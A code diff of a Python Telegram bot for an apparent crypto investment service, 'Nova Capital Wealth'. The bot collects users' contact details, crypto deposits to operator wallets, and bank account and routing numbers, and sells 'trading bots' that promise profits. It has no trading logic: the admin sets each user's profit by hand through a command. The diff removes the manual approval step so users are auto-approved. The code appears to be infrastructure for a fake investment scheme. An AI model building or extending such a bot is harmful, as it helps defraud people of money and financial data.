@@ -31,7 +31,7 @@ def get_admin_id() -> int:
     admin_id = os.getenv('ADMIN_USER_ID')
     if not admin_id:
         logger.error("ADMIN_USER_ID environment variable not set!")
-        return 0  # Default to 0, but this will be handled in functions
+        return 0
     try:
         return int(admin_id)
     except ValueError:
@@ -45,6 +45,7 @@ crypto_addresses = {
     'Ethereum': '0x1234567890abcdef1234567890abcdef12345678',
     'USDT': '0xabcdef1234567890abcdef1234567890abcdef12'
 }
+
 trading_bots = {
     'NCW Trading Bot': 'Custom-built algorithm by Nova Capital Wealth for optimal profits.',
     'AlphaTrend': 'Conservative strategy focusing on steady market trends.',
@@ -64,7 +65,7 @@ def get_user_data(user_id: int) -> Dict[str, Any]:
             'deposit': 0.0,
             'profit': 0.0,
             'withdrawal': 0.0,
-            'approved': False,
+            'approved': True,  # Automatically approve users
             'active_bot': None,
             'pending_deposit': 0.0,
             'pending_withdrawal': 0.0
@@ -83,6 +84,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features. Use admin commands like /adminpanel or /listusers.")
         return ConversationHandler.END
+
     keyboard = [
         [InlineKeyboardButton("🚀 Start Now", callback_data='start_registration')],
         [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
@@ -104,6 +106,7 @@ async def start_registration(update: Update, context: ContextTypes.DEFAULT_TYPE)
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     await context.bot.send_message(
@@ -120,6 +123,7 @@ async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
+
     user_info = get_user_data(user_id)
     user_info['name'] = update.message.text.strip()
     await update.message.reply_text(
@@ -135,6 +139,7 @@ async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
+
     user_info = get_user_data(user_id)
     user_info['email'] = update.message.text.strip()
     await update.message.reply_text(
@@ -150,37 +155,17 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
+
     user_info = get_user_data(user_id)
     user_info['phone'] = update.message.text.strip()
-    admin_message = f"""📝 **New User Registration**
 
-👤 **Name:** {user_info['name']}
-
-📧 **Email:** {user_info['email']}
-
-📱 **Phone:** {user_info['phone']}
-
-🆔 **User ID:** {user_id}
-
-Please create an account for this user on novacapitalwealthpro.com and send them the login details."""
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_user_{user_id}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    try:
-        await context.bot.send_message(
-            chat_id=admin_id,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
+    # Automatically approve user and notify
+    user_info['approved'] = True
     await update.message.reply_text(
-        f"Welcome, {user_info['name']}! Your registration is awaiting admin confirmation. You'll be notified once approved.",
-        reply_markup=create_cancel_keyboard()
+        f"Welcome, {user_info['name']}! Your account is ready. Access the main menu to start trading.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
     )
-    return MAIN_MENU  # Changed from ConversationHandler.END to MAIN_MENU
+    return MAIN_MENU
 
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Display the main menu"""
@@ -192,24 +177,17 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             text="Admins cannot access user features. Use admin commands like /adminpanel or /listusers."
         )
         return ConversationHandler.END
-    user_info = get_user_data(user_id)
-    if not user_info['approved']:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text="Your account is not approved yet. Please wait for admin confirmation."
-        )
-        return ConversationHandler.END
+
     if update.callback_query:
         query = update.callback_query
         await query.answer()
+
+    user_info = get_user_data(user_id)
     menu_text = f"""🎉 **Welcome, {user_info['name']}!** 🎉
 
 💰 **Available Balance:** ${user_info['balance']:.2f}
-
 📈 **Deposit:** ${user_info['deposit']:.2f}
-
 📊 **Profit:** ${user_info['profit']:.2f}
-
 📉 **Withdrawal:** ${user_info['withdrawal']:.2f}"""
     keyboard = [
         [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
@@ -221,6 +199,7 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
+
     if update.callback_query:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
@@ -242,6 +221,7 @@ async def handle_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     keyboard = [
@@ -266,6 +246,7 @@ async def show_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     keyboard = []
@@ -290,6 +271,7 @@ async def handle_crypto_selection(update: Update, context: ContextTypes.DEFAULT_
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     crypto_name = query.data.split('_')[-1]
@@ -308,6 +290,7 @@ async def get_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
+
     try:
         amount = float(update.message.text)
         if amount <= 0:
@@ -324,11 +307,8 @@ async def get_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE)
         message = f"""💳 **Deposit Details**
 
 💰 **Amount:** ${amount:.2f}
-
 🪙 **Cryptocurrency:** {crypto_name}
-
 🏦 **Wallet Address:** {address}
-
 ⚠️ **Security Warning:** Never share your payment details publicly. Only send to the address above."""
         await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='Markdown')
         return DEPOSIT_PROOF
@@ -349,13 +329,14 @@ async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     crypto_name = query.data.split('_')[-1]
     address = crypto_addresses[crypto_name]
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
-        text=f"{crypto_name} Address: {address}",  # Fixed invalid escape sequence
+        text=f"{crypto_name} Address: {address}",
         parse_mode='Markdown'
     )
     return DEPOSIT_PROOF
@@ -370,6 +351,7 @@ async def payment_made(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     await context.bot.send_message(
@@ -386,6 +368,7 @@ async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
+
     user_info = get_user_data(user_id)
     amount = context.user_data.get('deposit_amount', 0)
     crypto_name = context.user_data.get('selected_crypto', 'Unknown')
@@ -393,15 +376,10 @@ async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     admin_message = f"""💳 **New Deposit Request**
 
 👤 **User:** {user_info['name']} (ID: {user_id})
-
 💰 **Amount:** ${amount:.2f}
-
 🪙 **Crypto:** {crypto_name}
-
 📱 **Phone:** {user_info['phone']}
-
 📧 **Email:** {user_info['email']}
-
 Click 'Approve' to confirm this deposit."""
     keyboard = [
         [InlineKeyboardButton("✅ Approve", callback_data=f'confirm_deposit_{user_id}_{amount}')]
@@ -489,6 +467,7 @@ async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) 
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     keyboard = [
@@ -514,6 +493,7 @@ async def withdraw_crypto_amount(update: Update, context: ContextTypes.DEFAULT_T
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     context.user_data['withdrawal_method'] = 'crypto'
@@ -534,6 +514,7 @@ async def withdraw_bank_amount(update: Update, context: ContextTypes.DEFAULT_TYP
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     context.user_data['withdrawal_method'] = 'bank'
@@ -551,6 +532,7 @@ async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
+
     try:
         amount = float(update.message.text)
         user_info = get_user_data(user_id)
@@ -589,6 +571,7 @@ async def get_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
+
     context.user_data['crypto_address'] = update.message.text.strip()
     user_info = get_user_data(user_id)
     amount = context.user_data['withdraw_amount']
@@ -596,15 +579,10 @@ async def get_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE)
     admin_message = f"""💸 **Crypto Withdrawal Request**
 
 👤 **User:** {user_info['name']} (ID: {user_id})
-
 💰 **Amount:** ${amount:.2f}
-
 🏦 **Crypto Address:** {address}
-
 📱 **Phone:** {user_info['phone']}
-
 📧 **Email:** {user_info['email']}
-
 Click 'Approve' to confirm this withdrawal."""
     keyboard = [
         [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
@@ -638,6 +616,7 @@ async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
+
     context.user_data['bank_name'] = update.message.text.strip()
     await update.message.reply_text(
         "Please enter your account number:",
@@ -652,6 +631,7 @@ async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
+
     context.user_data['account_number'] = update.message.text.strip()
     await update.message.reply_text(
         "Please enter your routing number:",
@@ -666,6 +646,7 @@ async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if user_id == admin_id:
         await update.message.reply_text("Admins cannot access user features.")
         return ConversationHandler.END
+
     context.user_data['routing_number'] = update.message.text.strip()
     user_info = get_user_data(user_id)
     amount = context.user_data['withdraw_amount']
@@ -675,19 +656,12 @@ async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE)
     admin_message = f"""💸 **Bank Withdrawal Request**
 
 👤 **User:** {user_info['name']} (ID: {user_id})
-
 💰 **Amount:** ${amount:.2f}
-
 🏦 **Bank:** {bank_name}
-
 🔢 **Account:** {account_number}
-
 🔢 **Routing:** {routing_number}
-
 📱 **Phone:** {user_info['phone']}
-
 📧 **Email:** {user_info['email']}
-
 Click 'Approve' to confirm this withdrawal."""
     keyboard = [
         [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
@@ -774,6 +748,7 @@ async def show_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     keyboard = []
@@ -799,6 +774,7 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     bot_name = query.data.replace('select_bot_', '')
@@ -815,7 +791,6 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
         message = f"""✅ **{bot_name} Activated!**
 
 📋 **Description:** {description}
-
 Our refined strategy will keep you in profits. Monitor your progress in the main menu."""
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
@@ -835,6 +810,7 @@ async def handle_stake(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     await context.bot.send_message(
@@ -854,27 +830,20 @@ async def visit_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
-    user_info = get_user_data(user_id)
-    if not user_info['approved']:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text="Please wait for your account to be created. You'll be notified once approved.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-    else:
-        keyboard = [
-            [InlineKeyboardButton("🌐 Visit Nova Capital Wealth", url='https://novacapitalwealthpro.com')],
-            [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text="🌐 **Visit Our Website**\n\nClick the button below to access your trading account:",
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
+    keyboard = [
+        [InlineKeyboardButton("🌐 Visit Nova Capital Wealth", url='https://novacapitalwealthpro.com')],
+        [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="🌐 **Visit Our Website**\n\nClick the button below to access your trading account:",
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
+    )
     return MAIN_MENU
 
 async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -887,17 +856,15 @@ async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer("Balance refreshed! 🔄")
     user_info = get_user_data(user_id)
     menu_text = f"""🎉 **Welcome, {user_info['name']}!** 🎉
 
 💰 **Available Balance:** ${user_info['balance']:.2f}
-
 📈 **Deposit:** ${user_info['deposit']:.2f}
-
 📊 **Profit:** ${user_info['profit']:.2f}
-
 📉 **Withdrawal:** ${user_info['withdrawal']:.2f}"""
     keyboard = [
         [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
@@ -946,6 +913,7 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
             text="Admins cannot access user features."
         )
         return ConversationHandler.END
+
     query = update.callback_query
     await query.answer()
     return await show_main_menu(update, context)
@@ -974,12 +942,13 @@ def main() -> None:
     from admin import (
         send_admin_panel, admin_panel, handle_admin_action,
         approve_deposit, approve_withdrawal, update_profit,
-        update_crypto_address, approve_user, list_users, admin_help
-    )  # Import all necessary admin functions
+        update_crypto_address, list_users, admin_help
+    )
 
-    # Schedule send_admin_panel with admin_id check
+    # Set admin_id in bot_data
     admin_id = get_admin_id()
     if admin_id:
+        application.bot_data['admin_id'] = admin_id
         application.job_queue.run_once(send_admin_panel, 1, data={'admin_id': admin_id})
     else:
         logger.warning("ADMIN_USER_ID not set, admin panel will not be sent.")
@@ -1001,7 +970,6 @@ def main() -> None:
                 CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             MAIN_MENU: [
-                CallbackQueryHandler(show_main_menu, pattern='^proceed_to_menu$'),
                 CallbackQueryHandler(back_to_menu, pattern='^back_to_menu$'),
                 CallbackQueryHandler(refresh_balance, pattern='^refresh_balance$'),
                 CallbackQueryHandler(visit_website, pattern='^visit_website$'),
@@ -1052,26 +1020,20 @@ def main() -> None:
         per_message=False
     )
 
-    # Add handlers for user commands
     application.add_handler(conv_handler)
     application.add_handler(CommandHandler("getid", get_id))
-
-    # Add handlers for admin commands
     application.add_handler(CommandHandler("adminpanel", admin_panel))
     application.add_handler(CallbackQueryHandler(handle_admin_action, pattern='^admin_'))
     application.add_handler(CommandHandler("approve", approve_deposit))
     application.add_handler(CommandHandler("approvewithdrawal", approve_withdrawal))
     application.add_handler(CommandHandler("updateprofit", update_profit))
     application.add_handler(CommandHandler("updatecrypto", update_crypto_address))
-    application.add_handler(CommandHandler("approveuser", approve_user))
     application.add_handler(CommandHandler("listusers", list_users))
     application.add_handler(CommandHandler("adminhelp", admin_help))
-
-    # Add error handler
     application.add_error_handler(error_handler)
 
     logger.info("Starting NCW Trading Bot...")
     application.run_polling(allowed_updates=Update.ALL_TYPES, timeout=30)
-    
+
 if __name__ == '__main__':
     main()
